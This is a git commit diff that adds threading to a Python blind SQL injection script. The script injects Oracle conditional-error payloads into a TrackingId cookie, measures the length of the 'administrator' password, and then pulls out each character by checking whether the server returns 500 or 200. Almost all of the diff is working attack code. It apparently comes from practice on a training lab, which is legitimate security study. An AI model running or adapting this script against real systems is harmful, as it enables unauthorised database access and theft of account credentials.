142dee73ee3b1e95bd26d32b9e98028a41b40400
kaniehuest <77627612+kaniehuest@users.noreply.github.com>
2021-10-29 16:46:19 -0300

    added Threading to bsqli-2

--- bsqli-2.py
+++ bsqli-2.py
@@ -1,4 +1,5 @@
 import requests
+import threading
 import string
 import sys
 import urllib.parse
@@ -13,57 +14,54 @@ def get_password_length(url, trackingId, session):
   while True:
     payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > {i}) ||'"
     payload = urllib.parse.quote_plus(payload)
-    cookies = {
-      "TrackingId" :trackingId + payload,
-      "session" :session
-      }
-    r = requests.get(url, cookies=cookies)
+    cookies = {"TrackingId": trackingId + payload, "session": session}
+    response = requests.get(url, cookies=cookies)
 
-    if r.status_code == 200:
-      break
+    if response.status_code == 200:
+      return password_length
     else:
       i += 1
       password_length += 1
 
-  return password_length
-
 
 def get_password(password_length, url, trackingId, session):
   characters = string.ascii_lowercase + string.digits
-  password = ""
-  message = "[-] The password for 'administrator' is: "
-  print(message, end='', flush=True)
+  valid_password = []
+  threads = []
+
+  def test_password(i, character):
+      payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTR(password, {i+1}, 1) = '{character}') ||'"
+      payload = urllib.parse.quote_plus(payload)
+      cookies = {"TrackingId": trackingId + payload, "session": session}
+      response = requests.get(url, cookies=cookies)
+
+      if response.status_code == 500:
+        valid_password.append(character)
 
   for i in range(password_length):
-    for x in characters:
-      payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTR(password, {i + 1}, 1) = '{x}') ||'"
-      payload = urllib.parse.quote_plus(payload)
-      cookies = {
-        "TrackingId": trackingId + payload,
-        "session": session
-        }
-      r = requests.get(url, cookies=cookies)
+    for character in characters:
+      t = threading.Thread(target=test_password, args=(i, character))
+      threads.append(t)
 
-      if r.status_code == 500:
-        password += x
-        print(x, end='', flush=True)
-        break
+    for x in threads:
+      x.start() 
 
+    for x in threads:
+      x.join()
 
-  return f"[*] The password for 'administrator' is: {password}"
+    threads = []
+
+  password = "".join(valid_password)
+  return password
 
 
 def get_cookie(url):
   session = requests.Session()
-  if session.get(url).status_code != 200 :
-    sys.exit("[!] Error. Status code is not '200'")
-
   response = session.get(url)
   cookies = session.cookies.get_dict()
   values = list(cookies.values())
   trackingId = values[0]
   session = values[1]
-
   return trackingId, session 
 
 
@@ -86,13 +84,25 @@ def main(argv):
       print("\x1b[?25h", end="") # Make cursor visible 
       sys.exit()
 
+  # Create and start spinner animation
+  spinner = Halo(text="Getting password length...", spinner="bouncingBar")
+  spinner.start()
+  # Get valid username
   password_length = get_password_length(url, trackingId, session)
+  # Finish spinner
+  spinner.succeed(f"The password length is: \"{password_length}\"")
+
+  # Create and start spinner animation
+  spinner = Halo(text="Getting password...", spinner="bouncingBar")
+  spinner.start()
+  # Get valid password
   password = get_password(password_length, url, trackingId, session)
-  print(password)
+  # Finish spinner
+  spinner.succeed(f"The password is: \"{password}\"")
 
 
 if __name__ == "__main__":
-  print("\x1b[?25l") # Hide cursor
+  print("\x1b[?25l", end="") # Hide cursor
   main(sys.argv[1:])
-  print("\x1b[?25h") # Make cursor visible
+  print("\x1b[?25h", end="") # Make cursor visible
   sys.exit()
